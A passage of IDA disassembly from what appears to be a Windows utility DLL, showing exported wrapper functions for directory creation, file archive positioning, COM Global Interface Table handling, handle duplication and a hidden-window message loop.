		push	dword ptr [esi+4]
		call	sub_6AF44440
		mov	[esi+8], eax

loc_6AF44485:				; CODE XREF: sub_6AF44460+Ej
		pop	esi
		retn	8
sub_6AF44460	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	sub_6AF44489(size_t Size)
sub_6AF44489	proc near		; CODE XREF: Ordinal795+41p

var_1		= dword	ptr -1
Size		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	ecx
		push	esi
		lea	eax, [ebp+var_1]
		push	eax		; int
		push	[ebp+Size]	; Size
		mov	esi, ecx
		mov	byte ptr [ebp+var_1], 0
		call	sub_6AF44460
		mov	eax, esi
		pop	esi
		leave
		retn	4
sub_6AF44489	endp

; Exported entry 795.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl Ordinal795(LPCSTR	lpString2)
		public Ordinal795
Ordinal795	proc near		; DATA XREF: .rdata:off_6AF66098o

var_44		= byte ptr -44h
var_24		= byte ptr -24h
pszPath		= dword	ptr -20h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
lpString2	= dword	ptr  8

		mov	eax, offset unknown_libname_87 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 40h
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		push	edi
		mov	[ebp+var_10], esp
		push	offset aCfileMakesured ; "CFile::MakeSureDirectoryExists()"
		lea	ecx, [ebp+var_44]
		mov	[ebp+var_14], eax
		call	Ordinal751
		push	[ebp+lpString2]	; lpString
		and	[ebp+var_4], 0
		xor	ebx, ebx
		inc	ebx
		mov	byte ptr [ebp+var_4], bl
		call	ds:lstrlenA
		inc	eax
		inc	eax
		push	eax		; Size
		lea	ecx, [ebp+var_24]
		call	sub_6AF44489
		push	[ebp+lpString2]	; lpString2
		mov	edi, [ebp+pszPath]
		push	edi		; lpString1
		call	ds:lstrcpyA
		push	edi		; pszPath
		call	ds:PathAddBackslashA
		push	edi		; pszPath
		call	ds:PathIsUNCA
		test	eax, eax
		jz	short loc_6AF4451D
		push	edi		; pszPath
		call	ds:PathSkipRootA
		push	eax		; lpszCurrent
		push	edi		; lpszStart
		call	ds:CharPrevA
		jmp	short loc_6AF44528
; ---------------------------------------------------------------------------

loc_6AF4451D:				; CODE XREF: Ordinal795+63j
		push	5Ch		; unsigned int
		push	edi		; unsigned __int8 *

loc_6AF44520:				; CODE XREF: Ordinal795+DFj
		call	ds:_mbschr
		pop	ecx
		pop	ecx

loc_6AF44528:				; CODE XREF: Ordinal795+74j
		mov	esi, eax
		test	esi, esi
		jz	loc_6AF445C2
		test	ebx, ebx
		jz	loc_6AF445C2
		push	edi		; lpFileName
		mov	byte ptr [esi],	0
		call	ds:GetFileAttributesA
		cmp	eax, 0FFFFFFFFh
		jnz	short loc_6AF44588
		call	ds:GetLastError
		cmp	eax, 2
		jnz	short loc_6AF44577
		push	0		; lpSecurityAttributes
		push	edi		; lpPathName
		call	ds:CreateDirectoryA
		mov	ebx, eax
		test	ebx, ebx
		jnz	short loc_6AF44579
		call	ds:GetLastError
		push	eax		; Args
		push	offset aCfileMakesur_0 ; "CFile::MakeSureDirectoryExists() : Crea"...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF44596
; ---------------------------------------------------------------------------

loc_6AF44577:				; CODE XREF: Ordinal795+ABj
		xor	ebx, ebx

loc_6AF44579:				; CODE XREF: Ordinal795+BAj
					; Ordinal795+E3j
		push	esi		; lpsz
		mov	byte ptr [esi],	5Ch
		call	ds:CharNextA
		push	5Ch
		push	eax
		jmp	short loc_6AF44520
; ---------------------------------------------------------------------------

loc_6AF44588:				; CODE XREF: Ordinal795+A0j
		test	al, 10h
		jnz	short loc_6AF44579
		push	offset aCfileMakesur_1 ; "CFile::MakeSureDirectoryExists() : (dwA"...
		call	sub_6AF3102E

loc_6AF44596:				; CODE XREF: Ordinal795+CEj
		pop	ecx
		lea	ecx, [ebp+var_24]
		call	sub_6AF50389

loc_6AF4459F:				; DATA XREF: sub_6AF445CE+3Do
					; sub_6AF44611+4Fo
		xor	esi, esi

loc_6AF445A1:				; CODE XREF: Ordinal795+125j
		lea	ecx, [ebp+var_44]
		call	Ordinal752
		mov	ecx, [ebp+var_C]
		mov	large fs:0, ecx
		mov	ecx, [ebp+var_14]
		mov	eax, esi
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
; ---------------------------------------------------------------------------

loc_6AF445C2:				; CODE XREF: Ordinal795+85j
					; Ordinal795+8Dj
		lea	ecx, [ebp+var_24]
		call	sub_6AF50389
		mov	esi, ebx
		jmp	short loc_6AF445A1
Ordinal795	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF445CE	proc near		; DATA XREF: .rdata:6AF636BCo
		push	13h
		lea	ecx, [ebp-44h]
		call	Ordinal649
		push	offset aStdBad_alloc ; "std::bad_alloc"
		lea	ecx, [ebp-44h]
		call	Ordinal762
		mov	ecx, [ebp-4Ch]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		push	eax		; Src
		lea	ecx, [ebp-44h]
		call	Ordinal764
		lea	ecx, [ebp-44h]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF4459F
		retn
sub_6AF445CE	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF44611	proc near		; DATA XREF: .rdata:6AF636CCo
		push	15h
		lea	ecx, [ebp-44h]
		call	Ordinal649
		push	offset aCatlexception ;	"CAtlException"
		lea	ecx, [ebp-44h]
		call	Ordinal762
		mov	eax, [ebp-48h]
		push	dword ptr [eax]
		lea	eax, [ebp-24h]
		push	offset a0x08x	; "0x%08X"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp-24h]
		push	eax		; Src
		lea	ecx, [ebp-44h]
		call	Ordinal764
		lea	ecx, [ebp-44h]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF4459F
		retn
sub_6AF44611	endp

; Exported entry 796.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal796
Ordinal796	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	esi
		push	edi
		push	[esp+8+arg_0]
		mov	esi, ecx
		call	Ordinal311
		lea	edi, [esi+18h]
		mov	ecx, edi
		call	Ordinal768
		mov	dword ptr [edi], offset	off_6AF5C5BC
		pop	edi
		mov	dword ptr [esi], offset	off_6AF5C5AC
		mov	eax, esi
		pop	esi
		retn	4
Ordinal796	endp

; Exported entry 797.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal797
Ordinal797	proc near		; CODE XREF: sub_6AF44784+3p
					; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		lea	ecx, [esi+18h]
		mov	dword ptr [esi], offset	off_6AF5C5AC
		mov	dword ptr [ecx], offset	off_6AF5C5BC
		call	Ordinal770
		mov	ecx, esi
		pop	esi
		jmp	Ordinal312
Ordinal797	endp

; Exported entry 800.
; Exported entry 1438.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1438
Ordinal1438	proc near		; DATA XREF: .rdata:off_6AF66098o
		jmp	Ordinal319	; ccL30_800
Ordinal1438	endp

; Exported entry 801.
; Exported entry 1439.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal801
Ordinal801	proc near		; DATA XREF: .rdata:off_6AF66098o
		jmp	Ordinal320	; ccL30_801
Ordinal801	endp

; Exported entry 802.
; Exported entry 1440.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal802
Ordinal802	proc near		; DATA XREF: .rdata:off_6AF66098o
		jmp	Ordinal321	; ccL30_802
Ordinal802	endp

; Exported entry 803.
; Exported entry 1441.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal803
Ordinal803	proc near		; DATA XREF: .rdata:off_6AF66098o
		jmp	Ordinal322	; ccL30_803
Ordinal803	endp

; Exported entry 804.
; Exported entry 1442.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1442
Ordinal1442	proc near		; DATA XREF: .rdata:off_6AF66098o
		jmp	Ordinal323	; ccL30_804
Ordinal1442	endp

; Exported entry 805.
; Exported entry 1443.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1443
Ordinal1443	proc near		; DATA XREF: .rdata:off_6AF66098o
		jmp	Ordinal324	; ccL30_805
Ordinal1443	endp

; Exported entry 806.
; Exported entry 1444.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1444
Ordinal1444	proc near		; DATA XREF: .rdata:off_6AF66098o
		jmp	Ordinal325	; ccL30_806
Ordinal1444	endp

; Exported entry 807.
; Exported entry 1445.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1445
Ordinal1445	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8

		push	[esp+arg_4]	; ccL30_807
		push	[esp+4+arg_0]
		call	Ordinal326
		retn	8
Ordinal1445	endp

; Exported entry 809.
; Exported entry 1447.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal1447(double)
		public Ordinal1447
Ordinal1447	proc near		; DATA XREF: .rdata:off_6AF66098o

var_8		= qword	ptr -8
arg_0		= qword	ptr  4

		fld	[esp+arg_0]	; ccL30_809
		push	ecx
		push	ecx
		fstp	[esp+8+var_8]
		call	Ordinal328
		retn	8
Ordinal1447	endp

; Exported entry 810.
; Exported entry 1448.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal810
Ordinal810	proc near		; DATA XREF: .rdata:off_6AF66098o
		jmp	Ordinal329	; ccL30_810
Ordinal810	endp

; Exported entry 811.
; Exported entry 1449.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1449
Ordinal1449	proc near		; DATA XREF: .rdata:off_6AF66098o
		jmp	Ordinal330	; ccL30_811
Ordinal1449	endp

; Exported entry 816.
; Exported entry 1454.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal816
Ordinal816	proc near		; DATA XREF: .rdata:off_6AF66098o
		jmp	Ordinal335	; ccL30_816
Ordinal816	endp

; Exported entry 817.
; Exported entry 1455.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1455
Ordinal1455	proc near		; DATA XREF: .rdata:off_6AF66098o
		jmp	Ordinal336	; ccL30_817
Ordinal1455	endp

; Exported entry 821.
; Exported entry 1459.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1459
Ordinal1459	proc near		; DATA XREF: .rdata:off_6AF66098o
		jmp	Ordinal340	; ccL30_821
Ordinal1459	endp

; Exported entry 822.
; Exported entry 1460.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1460
Ordinal1460	proc near		; DATA XREF: .rdata:off_6AF66098o
		jmp	Ordinal341	; ccL30_822
Ordinal1460	endp

; Exported entry 824.
; Exported entry 1462.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal824
Ordinal824	proc near		; DATA XREF: .rdata:off_6AF66098o
		jmp	Ordinal343	; ccL30_824
Ordinal824	endp

; Exported entry 825.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal825
Ordinal825	proc near		; DATA XREF: .rdata:6AF5C5B0o
					; .rdata:off_6AF66098o
		add	ecx, 18h
		jmp	Ordinal778
Ordinal825	endp

; Exported entry 826.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal826
Ordinal826	proc near		; DATA XREF: .rdata:6AF5C5B4o
					; .rdata:off_6AF66098o
		add	ecx, 18h
		jmp	Ordinal780
Ordinal826	endp

; Exported entry 827.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal827(LONG	lDistanceToMove, int)
		public Ordinal827
Ordinal827	proc near		; DATA XREF: .rdata:6AF5C5B8o
					; .rdata:off_6AF66098o

var_8		= dword	ptr -8
var_4		= dword	ptr -4
lDistanceToMove	= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ecx
		and	[ebp+var_8], 0
		and	[ebp+var_4], 0
		push	esi
		lea	esi, [ecx+18h]
		lea	eax, [ebp+var_8]
		push	eax
		mov	ecx, esi
		call	Ordinal787
		test	eax, eax
		jnz	short loc_6AF4474D
		push	offset aCfilearchiveSe ; "CFileArchive::SetPosEx() : CFile::GetLe"...
		jmp	short loc_6AF44764
; ---------------------------------------------------------------------------

loc_6AF4474D:				; CODE XREF: Ordinal827+1Ej
		mov	eax, [ebp+arg_4]
		cmp	eax, [ebp+var_4]
		mov	ecx, [ebp+lDistanceToMove]
		jb	short loc_6AF4476E
		ja	short loc_6AF4475F
		cmp	ecx, [ebp+var_8]
		jb	short loc_6AF4476E

loc_6AF4475F:				; CODE XREF: Ordinal827+32j
		push	offset aCfilearchive_0 ; "CFileArchive::SetPosEx() : uPos >= uFil"...

loc_6AF44764:				; CODE XREF: Ordinal827+25j
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF44777
; ---------------------------------------------------------------------------

loc_6AF4476E:				; CODE XREF: Ordinal827+30j
					; Ordinal827+37j
		push	eax		; int
		push	ecx		; lDistanceToMove
		mov	ecx, esi
		call	Ordinal792

loc_6AF44777:				; CODE XREF: Ordinal827+46j
		pop	esi
		leave
		retn	8
Ordinal827	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF4477C	proc near		; DATA XREF: .rdata:off_6AF5C5BCo
		sub	ecx, 18h
		jmp	$+5
sub_6AF4477C	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF44784(void *, char)
sub_6AF44784	proc near		; DATA XREF: .rdata:off_6AF5C5ACo

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal797
		test	[esp+4+arg_0], 1
		jz	short loc_6AF4479A
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF4479A:				; CODE XREF: sub_6AF44784+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF44784	endp

; Exported entry 828.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal828
Ordinal828	proc near		; DATA XREF: .rdata:off_6AF66098o
		mov	eax, ecx
		and	dword ptr [eax+4], 0
		mov	dword ptr [eax], offset	off_6AF5C628
		retn
Ordinal828	endp

; Exported entry 831.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal831
Ordinal831	proc near		; CODE XREF: Ordinal829+6j
					; Ordinal830+3p ...
		push	esi
		mov	esi, ecx
		mov	eax, [esi+4]
		test	eax, eax
		jz	short loc_6AF447C1
		mov	ecx, [eax]
		push	eax
		call	dword ptr [ecx+8]
		and	dword ptr [esi+4], 0

loc_6AF447C1:				; CODE XREF: Ordinal831+8j
		pop	esi
		retn
Ordinal831	endp

; Exported entry 832.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal832
Ordinal832	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		cmp	dword ptr [ecx+4], 0
		jnz	short loc_6AF447D0
		mov	eax, 80004005h
		jmp	short locret_6AF447F4
; ---------------------------------------------------------------------------

loc_6AF447D0:				; CODE XREF: Ordinal832+4j
		mov	eax, [ecx+4]
		mov	ecx, [eax]
		push	esi
		push	[esp+4+arg_0]
		push	eax
		call	dword ptr [ecx+10h]
		mov	esi, eax
		test	esi, esi
		jge	short loc_6AF447F1
		push	esi		; Args
		push	offset aCgitRevokeM_pg ; "CGIT::Revoke() : m_pGIT->RevokeInterfac"...
		call	sub_6AF3102E
		pop	ecx
		pop	ecx

loc_6AF447F1:				; CODE XREF: Ordinal832+1Fj
		mov	eax, esi
		pop	esi

locret_6AF447F4:			; CODE XREF: Ordinal832+Bj
		retn	4
Ordinal832	endp

; Exported entry 829.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal829
Ordinal829	proc near		; DATA XREF: .rdata:off_6AF66098o
		mov	dword ptr [ecx], offset	off_6AF5C628
		jmp	Ordinal831
Ordinal829	endp

; Exported entry 830.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal830
Ordinal830	proc near		; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		call	Ordinal831
		add	esi, 4
		push	esi		; ppv
		push	offset riid	; riid
		push	1		; dwClsContext
		push	0		; pUnkOuter
		push	offset rclsid	; rclsid
		call	ds:CoCreateInstance
		mov	esi, eax
		test	esi, esi
		jge	short loc_6AF44835
		push	esi		; Args
		push	offset aCgitCreateCocr ; "CGIT::Create() : CoCreateInstance(IID_I"...
		call	sub_6AF3102E
		pop	ecx
		pop	ecx

loc_6AF44835:				; CODE XREF: Ordinal830+24j
		mov	eax, esi
		pop	esi
		retn
Ordinal830	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF44839(void *, char)
sub_6AF44839	proc near		; DATA XREF: .rdata:off_6AF5C628o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		mov	dword ptr [esi], offset	off_6AF5C628
		call	Ordinal831
		test	[esp+4+arg_0], 1
		jz	short loc_6AF44855
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF44855:				; CODE XREF: sub_6AF44839+13j
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF44839	endp

; Exported entry 833.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal833
Ordinal833	proc near		; CODE XREF: Ordinal1028+33p
					; DATA XREF: .rdata:off_6AF66098o
		mov	eax, ecx
		and	dword ptr [eax+4], 0
		mov	dword ptr [eax], offset	off_6AF5C6C8
		retn
Ordinal833	endp

; Exported entry 845.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal845
Ordinal845	proc near		; CODE XREF: Ordinal844+3p
					; Ordinal1030+157p
					; DATA XREF: ...
		mov	eax, [ecx+4]
		test	eax, eax
		jz	short loc_6AF44878
		cmp	eax, 0FFFFFFFFh
		jz	short loc_6AF44878
		xor	eax, eax
		inc	eax
		retn
; ---------------------------------------------------------------------------

loc_6AF44878:				; CODE XREF: Ordinal845+5j
					; Ordinal845+Aj
		xor	eax, eax
		retn
Ordinal845	endp

; Exported entry 844.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal844
Ordinal844	proc near		; CODE XREF: Ordinal836+6j
					; Ordinal840+11p ...
		push	esi
		mov	esi, ecx
		call	Ordinal845
		test	eax, eax
		jz	short loc_6AF44894
		push	dword ptr [esi+4] ; hObject
		call	ds:CloseHandle
		and	dword ptr [esi+4], 0

loc_6AF44894:				; CODE XREF: Ordinal844+Aj
		pop	esi
		retn
Ordinal844	endp

; Exported entry 836.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal836
Ordinal836	proc near		; CODE XREF: Ordinal1029+16p
					; DATA XREF: .rdata:off_6AF66098o
		mov	dword ptr [ecx], offset	off_6AF5C6C8
		jmp	Ordinal844
Ordinal836	endp

; Exported entry 840.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal840
Ordinal840	proc near		; CODE XREF: Ordinal835+11p
					; Ordinal838+7p
					; DATA XREF: ...

arg_0		= dword	ptr  4

		push	esi
		push	edi
		mov	edi, [esp+8+arg_0]
		cmp	edi, 0FFFFFFFFh
		mov	esi, ecx
		jz	short loc_6AF448BF
		test	edi, edi
		jz	short loc_6AF448BF
		call	Ordinal844
		xor	eax, eax
		mov	[esi+4], edi
		inc	eax
		jmp	short loc_6AF448CC
; ---------------------------------------------------------------------------

loc_6AF448BF:				; CODE XREF: Ordinal840+Bj
					; Ordinal840+Fj
		push	offset aChandleAttachH ; "CHandle::Attach() : hHandle == NULL\n"
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax

loc_6AF448CC:				; CODE XREF: Ordinal840+1Cj
		pop	edi
		pop	esi
		retn	4
Ordinal840	endp

; Exported entry 841.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal841
Ordinal841	proc near		; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, [ecx+4]
		and	dword ptr [ecx+4], 0
		call	Ordinal844
		mov	eax, esi
		pop	esi
		retn
Ordinal841	endp

; Exported entry 842.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal842(HANDLE hSourceHandle)
		public Ordinal842
Ordinal842	proc near		; CODE XREF: Ordinal843+7p
					; .text:6AF48D03p
					; DATA XREF: ...

hSourceHandle	= dword	ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal844
		push	2		; dwOptions
		push	1		; bInheritHandle
		push	0		; dwDesiredAccess
		add	esi, 4
		push	esi		; lpTargetHandle
		mov	esi, ds:GetCurrentProcess
		call	esi ; GetCurrentProcess
		push	eax		; hTargetProcessHandle
		push	[esp+18h+hSourceHandle]	; hSourceHandle
		call	esi ; GetCurrentProcess
		push	eax		; hSourceProcessHandle
		call	ds:DuplicateHandle
		test	eax, eax
		pop	esi
		jnz	short loc_6AF44926
		call	ds:GetLastError
		push	eax		; Args
		push	offset aChandleCopyDup ; "CHandle::Copy() : DuplicateHandle() == "...
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		xor	eax, eax
		jmp	short locret_6AF44929
; ---------------------------------------------------------------------------

loc_6AF44926:				; CODE XREF: Ordinal842+2Bj
		xor	eax, eax
		inc	eax

locret_6AF44929:			; CODE XREF: Ordinal842+42j
		retn	4
Ordinal842	endp

; Exported entry 843.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal843
Ordinal843	proc near		; CODE XREF: Ordinal834+11p
					; Ordinal837+Dp
					; DATA XREF: ...

arg_0		= dword	ptr  4

		mov	eax, [esp+arg_0]
		push	dword ptr [eax+4] ; hSourceHandle
		call	Ordinal842
		retn	4
Ordinal843	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF4493B(void *, char)
sub_6AF4493B	proc near		; DATA XREF: .rdata:off_6AF5C6C8o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		mov	dword ptr [esi], offset	off_6AF5C6C8
		call	Ordinal844
		test	[esp+4+arg_0], 1
		jz	short loc_6AF44957
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF44957:				; CODE XREF: sub_6AF4493B+13j
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF4493B	endp

; Exported entry 834.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal834
Ordinal834	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	esi
		push	[esp+4+arg_0]
		mov	esi, ecx
		and	dword ptr [esi+4], 0
		mov	dword ptr [esi], offset	off_6AF5C6C8
		call	Ordinal843
		test	eax, eax
		jnz	short loc_6AF44982
		push	offset aChandleChandle ; "CHandle::CHandle() : Copy() == FALSE\n"
		call	sub_6AF3102E
		pop	ecx

loc_6AF44982:				; CODE XREF: Ordinal834+18j
		mov	eax, esi
		pop	esi
		retn	4
Ordinal834	endp

; Exported entry 835.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal835
Ordinal835	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	esi
		push	[esp+4+arg_0]
		mov	esi, ecx
		and	dword ptr [esi+4], 0
		mov	dword ptr [esi], offset	off_6AF5C6C8
		call	Ordinal840
		test	eax, eax
		jnz	short loc_6AF449AD
		push	offset aChandleChand_0 ; "CHandle::CHandle() : Attach()	== FALSE\n"...
		call	sub_6AF3102E
		pop	ecx

loc_6AF449AD:				; CODE XREF: Ordinal835+18j
		mov	eax, esi
		pop	esi
		retn	4
Ordinal835	endp

; Exported entry 837.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal837
Ordinal837	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	esi
		mov	esi, ecx
		cmp	[esp+4+arg_0], esi
		jz	short loc_6AF449D4
		push	[esp+4+arg_0]
		call	Ordinal843
		test	eax, eax
		jnz	short loc_6AF449D4
		push	offset aChandleOperato ; "CHandle::operator =()	: Copy() == FALSE"...
		call	sub_6AF3102E
		pop	ecx

loc_6AF449D4:				; CODE XREF: Ordinal837+7j
					; Ordinal837+14j
		mov	eax, esi
		pop	esi
		retn	4
Ordinal837	endp

; Exported entry 838.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal838
Ordinal838	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	esi
		push	[esp+4+arg_0]
		mov	esi, ecx
		call	Ordinal840
		test	eax, eax
		jnz	short loc_6AF449F5
		push	offset aChandleOpera_0 ; "CHandle::operator =()	: Attach() == FAL"...
		call	sub_6AF3102E
		pop	ecx

loc_6AF449F5:				; CODE XREF: Ordinal838+Ej
		mov	eax, esi
		pop	esi
		retn	4
Ordinal838	endp

; Exported entry 847.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal847
Ordinal847	proc near		; CODE XREF: sub_6AF44B93+3p
					; Ordinal856+62p
					; DATA XREF: ...
		mov	dword ptr [ecx], offset	off_6AF5C7D4
		jmp	Ordinal891
Ordinal847	endp

; Exported entry 855.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal855
Ordinal855	proc near		; DATA XREF: .rdata:6AF5CA14o
					; .rdata:6AF5DDA0o ...
		push	esi
		mov	esi, ecx
		mov	eax, [esi+38h]
		xor	ecx, ecx
		cmp	eax, ecx
		jz	short loc_6AF44A1F
		push	ecx		; lParam
		push	ecx		; wParam
		push	10h		; Msg
		push	eax		; hWnd
		call	ds:PostMessageA
		jmp	short loc_6AF44A31
; ---------------------------------------------------------------------------

loc_6AF44A1F:				; CODE XREF: Ordinal855+Aj
		mov	eax, [esi+1Ch]
		cmp	eax, ecx
		jz	short loc_6AF44A31
		push	ecx		; lParam
		push	ecx		; wParam
		push	12h		; Msg
		push	eax		; idThread
		call	ds:PostThreadMessageA

loc_6AF44A31:				; CODE XREF: Ordinal855+17j
					; Ordinal855+1Ej
		mov	ecx, esi
		pop	esi
		jmp	Ordinal1389
Ordinal855	endp

; Exported entry 857.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal857
Ordinal857	proc near		; DATA XREF: .rdata:6AF5CA20o
					; .rdata:6AF5DDACo ...
		push	esi
		push	offset aChiddenwindowE ; "CHiddenWindow::ExitInstance()\n"
		mov	esi, ecx
		call	sub_6AF31006
		mov	eax, [esi+38h]
		test	eax, eax
		pop	ecx
		jz	short loc_6AF44A59
		push	eax		; hWnd
		call	ds:DestroyWindow
		and	dword ptr [esi+38h], 0

loc_6AF44A59:				; CODE XREF: Ordinal857+13j
		cmp	word ptr [esi+3Ch], 0
		jz	short loc_6AF44A79
		push	0		; lpModuleName
		call	ds:GetModuleHandleA
		push	eax		; hInstance
		movzx	eax, word ptr [esi+3Ch]
		push	eax		; lpClassName
		call	ds:UnregisterClassA
		and	word ptr [esi+3Ch], 0

loc_6AF44A79:				; CODE XREF: Ordinal857+25j
		pop	esi
		retn
Ordinal857	endp

; Exported entry 858.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal858
Ordinal858	proc near		; DATA XREF: .rdata:6AF5CA18o
					; .rdata:6AF5DDA4o ...

Msg		= MSG ptr -1Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 1Ch
		push	esi
		push	edi
		push	offset aChiddenwindowR ; "CHiddenWindow::Run()\n"
		call	sub_6AF31006
		mov	esi, ds:GetMessageA
		pop	ecx
		xor	edi, edi
		jmp	short loc_6AF44AAC
; ---------------------------------------------------------------------------

loc_6AF44A98:				; CODE XREF: Ordinal858+3Dj
		lea	eax, [ebp+Msg]
		push	eax		; lpMsg
		call	ds:TranslateMessage
		lea	eax, [ebp+Msg]
		push	eax		; lpMsg
		call	ds:DispatchMessageA

loc_6AF44AAC:				; CODE XREF: Ordinal858+1Bj
		push	edi		; wMsgFilterMax
		push	edi		; wMsgFilterMin
		lea	eax, [ebp+Msg]
		push	edi		; hWnd
		push	eax		; lpMsg
		call	esi ; GetMessageA
		cmp	eax, 1
		jz	short loc_6AF44A98
		mov	eax, [ebp+Msg.wParam]
		pop	edi
		pop	esi
		leave
		retn
Ordinal858	endp

; Exported entry 859.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal859(int,	int, char Args,	int)
		public Ordinal859
Ordinal859	proc near		; DATA XREF: .rdata:6AF5CA30o
					; .rdata:6AF5DDBCo ...

arg_4		= dword	ptr  0Ch
Args		= byte ptr  10h
arg_C		= dword	ptr  14h

		push	ebp
		mov	ebp, esp
		mov	eax, [ebp+arg_4]
		dec	eax
		dec	eax
		push	esi
		mov	esi, ecx
		jz	short loc_6AF44B2B
		sub	eax, 0Fh
		jz	short loc_6AF44B17
		sub	eax, 5
		jz	short loc_6AF44AE0
		pop	esi
		pop	ebp
		jmp	ds:DefWindowProcA
; ---------------------------------------------------------------------------

loc_6AF44AE0:				; CODE XREF: Ordinal859+15j
		push	edi
		mov	edi, [ebp+arg_C]
		push	edi
		push	dword ptr [ebp+Args] ; Args
		push	offset aChiddenwindowW ; "CHiddenWindow::WindowProc() :	WM_ENDSES"...
		call	sub_6AF31006
		mov	edx, [esi]
		mov	eax, 80000000h
		and	edi, eax
		xor	ecx, ecx
		add	esp, 0Ch
		cmp	edi, eax
		setnz	cl
		xor	eax, eax
		cmp	dword ptr [ebp+Args], eax
		setnz	al
		push	ecx
		mov	ecx, esi
		push	eax
		call	dword ptr [edx+20h]
		pop	edi
		jmp	short loc_6AF44B55
; ---------------------------------------------------------------------------

